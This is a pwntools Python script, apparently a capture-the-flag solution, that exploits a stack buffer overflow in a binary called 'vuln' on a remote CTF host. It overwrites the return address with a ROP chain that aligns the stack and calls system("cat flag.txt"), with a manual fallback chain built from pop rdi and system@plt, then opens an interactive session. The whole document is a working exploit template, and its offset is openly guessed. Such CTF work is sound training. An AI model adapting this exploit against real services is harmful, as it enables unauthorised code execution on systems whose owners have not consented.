from pwn import *

# Set up context
binary_path = './vuln'
elf = ELF(binary_path)
p = remote("gzcli.techcomfest.1pc.tf", 44735)
# p = process(binary_path) # Debug locally first!

# 1. FIND OFFSET
# If you haven't verified the offset, 40 is a common guess for these challenges.
# If 40 fails, try 72 or 24.
offset = 40 

# 2. FIND GADGETS
# We need a plain 'ret' instruction for stack alignment
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0] # Automatically finds a 'ret' address

# 3. CONSTRUCT PAYLOAD
# Case A: If there is a "win" function (check via: nm vuln | grep win)
# payload = flat({
#     offset: [
#         p64(ret_gadget),          # 1. Align Stack
#         p64(elf.symbols['win'])   # 2. Jump to win function
#     ]
# })

# Case B: Manual ROP (System + String)
# Using the address you found: 0x400695 (The call to system)
# We need to ensure 'rdi' points to "cat flag.txt" first.
try:
    # Attempt to automatically build the chain
    rop = ROP(elf)
    rop.call(ret_gadget)                 # Align stack
    rop.system(next(elf.search(b"cat flag.txt"))) # System("cat flag.txt")
    
    payload = b"A" * offset + rop.chain()
    
except Exception as e:
    # Fallback if automation fails: Manual construction
    print(f"Auto-ROP failed: {e}. Trying manual...")
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    bin_sh  = next(elf.search(b"cat flag.txt"))
    system_plt = elf.plt['system']
    
    payload = flat([
        b"A" * offset,
        p64(ret_gadget),  # <--- CRITICAL FIX
        p64(pop_rdi),
        p64(bin_sh),
        p64(system_plt)
    ])

print(f"Sending payload length: {len(payload)}")
p.sendline(payload)
p.interactive()
